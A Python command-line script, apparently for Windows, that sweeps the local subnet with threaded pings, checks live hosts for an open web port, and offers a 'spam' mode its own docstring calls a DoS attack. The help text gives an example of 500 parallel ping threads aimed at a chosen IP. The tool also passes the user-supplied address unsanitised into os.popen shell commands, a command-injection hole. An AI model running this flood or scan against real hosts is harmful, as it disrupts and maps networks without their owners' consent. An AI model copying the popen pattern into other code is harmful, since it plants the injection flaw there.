import requests
import os
import threading
import sys
import re


lock = threading.Lock()

def check_localhosts(port, file='Active IP list.txt', timeout=0.5):
    """
    will scan the localhosts of the ip addresses in the C subnet mask class.
    :param port: port number.
    :param file: text file to save the results.
    :param timeout: how much before breaking the requests (in seconds).
    :return: the list of the active ip addresses with localhost on.
    """
    with open(file, 'r') as f:
        ip_list = f.read().split('\n')

    active_localhosts = []
    for ip in ip_list:
        url = 'http://' + ip + ':' + port + '/'
        print(f"current URL -- {url}")
        try:
            res = requests.get(url, timeout=timeout)
        except Exception as e:
            continue
        if res.status_code == 200:
            print(f"result -- {url}")
            active_localhosts.append(url)

    print("-----\nActive addresses:")
    [print(address) for address in active_localhosts]
    return active_localhosts



def check_valid_ip_addresses(start_ip, end_ip, my_ip, num_of_packets=4):
    """
    will check weather an ip is active or not in range of a given start ip and end ip.
    :param start_ip: address to start scan with
    :param end_ip: address to end scan with
    :param my_ip: my ip address
    :param num_of_packets: how many packets to send in each ping
    """
    ip = '.'.join(my_ip.split('.')[:3])
    ip += '.{}'
    for address in range(start_ip, end_ip):
        ip = ip.format(address)
        cmd_output = os.popen(f'ping {ip} -n {num_of_packets}').read()

        lock.acquire()
        if f'Received = {num_of_packets}' in cmd_output and not "unreachable" in cmd_output:
            ACTIVE_IP_LIST.append(ip)
            print("ACTIVE IP -- " + ip)
        else:
            print("unreachable IP -- " + ip)
        lock.release()


def build_threads_list(num_of_threads=128, num_of_packets=4):
    """
    will build the threads for the scan.
    :return: the threads list for execution
    """
    my_addresses_dict = find_my_address_and_dg()
    if my_addresses_dict["sm"] != "255.255.255.0":
        print("\nThis program does not support different subnet mask than 255.255.255.0 at the moment.")
        raise SystemExit(HELP)
    my_ip = my_addresses_dict["ip"]

    if not 0 < num_of_threads <= 256:
        print("\nThe number of threads should be between 1-256.")
        raise SystemExit(HELP)
    if 256 % num_of_threads != 0:
        print("\nThe number of threads must be an exponent ^ of 2 - (1, 2, 4, 8, 16, 32..,256...).")
        raise SystemExit(HELP)
    if not 0 < num_of_packets <= 8:
        print("\nThe number of packets should be between 1-8.")
        raise SystemExit(HELP)
    scans_per_thread = 256 // num_of_threads
    remainder = 256 % num_of_threads
    threads = []
    start_ip = 0
    end_ip = scans_per_thread
    for x in range(num_of_threads):
        t = threading.Thread(target=check_valid_ip_addresses, args=(start_ip, end_ip, my_ip, num_of_packets), daemon=True)
        start_ip += scans_per_thread
        end_ip += scans_per_thread
        threads.append(t)

    if remainder > 0:
        t = threading.Thread(target=check_valid_ip_addresses, args=(end_ip, end_ip + remainder, my_ip), daemon=True)
        threads.append(t)

    return threads



def scan_lan_ips(num_of_threads=128, num_of_packets=4):
    """
    will use the threads for the actual scan
    """
    global ACTIVE_IP_LIST
    ACTIVE_IP_LIST = []

    threads_list = build_threads_list(num_of_threads, num_of_packets)

    for i in range(num_of_threads):
        threads_list[i].start()
    for i in range(num_of_threads):
        threads_list[i].join()

    # The below code will execute if the threads will not SystemExit the program during the scans.
    with open("Active IP list.txt", 'w+') as f:
        ACTIVE_IP_LIST = '\n'.join(ACTIVE_IP_LIST)
        f.write(ACTIVE_IP_LIST)
        print("\n----------\nFinal active IP's list:")
        print(ACTIVE_IP_LIST)
        print("\nThe list were saved in 'Active IP list.txt'.")


def find_my_address_and_dg():
    """
    Find the current IP address, default gateway and subnet mask.
    dg - stands for default gateway
    :return: dictionary of the three addresses {IP: __, dg: __, sm: __}
    """
    cmd_output = os.popen(f'ipconfig').read()
    cmd_output_regex = re.compile(r'\d+\.\d+\.\d+\.\d+')
    my_addresses = cmd_output_regex.findall(cmd_output)

    return {
        "ip": my_addresses[0],
        "sm": my_addresses[1],
        "dg": my_addresses[2]
    }


def build_threads_for_spam(ip, num_of_threads, num_of_packets):
    """
    will set up the threads for the DoS attack.
    """
    threads_list = []
    for x in range(num_of_threads):
        t = threading.Thread(target=spam_address, args=(ip, num_of_packets), daemon=True)
        threads_list.append(t)

    return threads_list


def spam_address(ip, num_of_packets):
    """
    The ping request.
    """
    cmd_output = os.popen(f'ping {ip} -n {num_of_packets}').read()


def execute_spam(ip, num_of_threads, num_of_packets):
    """
    Will execute the threads and spam the desired ip address.
    """
    print(f"Spamming {ip} with {num_of_threads} requests each second for approximately {num_of_packets} seconds")
    threads_list = build_threads_for_spam(ip, num_of_threads, num_of_packets)

    for i in range(num_of_threads):
        threads_list[i].start()
    for i in range(num_of_threads):
        threads_list[i].join()



def cmd_executer():
    """
    final function for cmd type execution.
    """
    cmd_args = sys.argv[1:]
    if len(cmd_args) == 0:
        print("You did not pass any arguments.")
        raise SystemExit(HELP)

    if cmd_args[0] == "help":
        raise SystemExit(HELP)

    if cmd_args[0] == "scan" and cmd_args[1] == "-t" and cmd_args[2].isalnum():
        num_of_threads = int(cmd_args[2])
        if len(cmd_args) > 4:
            if cmd_args[3] == "-n" and cmd_args[4].isalnum():
                num_of_packets = int(cmd_args[4])
                scan_lan_ips(num_of_threads, num_of_packets)
            else:
                raise SystemExit(HELP)
        else:
            scan_lan_ips(num_of_threads)

    elif cmd_args[0] == "myip":
        my_address_dict = find_my_address_and_dg()
        print("My IP......................: " + my_address_dict["ip"])
        print("My Default Gateway.........: " + my_address_dict["dg"])
        print("My Subnet Mask.............: " + my_address_dict["sm"])

    elif cmd_args[0] == "spam" and cmd_args[2] == "-t" and cmd_args[3].isalnum()\
        and cmd_args[4] == "-n" and cmd_args[5].isalnum():
        ip = cmd_args[1]
        num_of_threads = int(cmd_args[3])
        num_of_packets = int(cmd_args[5])

        execute_spam(ip, num_of_threads, num_of_packets)


    else:
        raise SystemExit(HELP)


HELP = """
List of actions:

    scan [-t]  (number of desired threads                      | 1-256 | defaults to 128)
         [-n]  (number of packets to send in each ping request | 1-8   | defaults to 4)
    
        EXAMPLE:
        scan -t 128 -n 4                        Scans the LAN network with 128 threads
                                                each one performs 2 scans. Each scan sends 4 packets (ping).
                                                
    myip                                        Checks my IP, my Default Gateway and my Subnet Mask.
    
    spam [ip]  (ip address to spam with ping requests                     )
         [-t]  (number of desired threads                       | 1-256 | )
         [-n]  (number of packets to send in each request                 )
         
         EXAMPLE:
         spam 192.168.1.110 -t 500 -n 20       spams the address with 500 threads of pings, each thread
                                               sends 20 pings (approximately one ping for second).
"""

if __name__ == '__main__':
    cmd_executer()
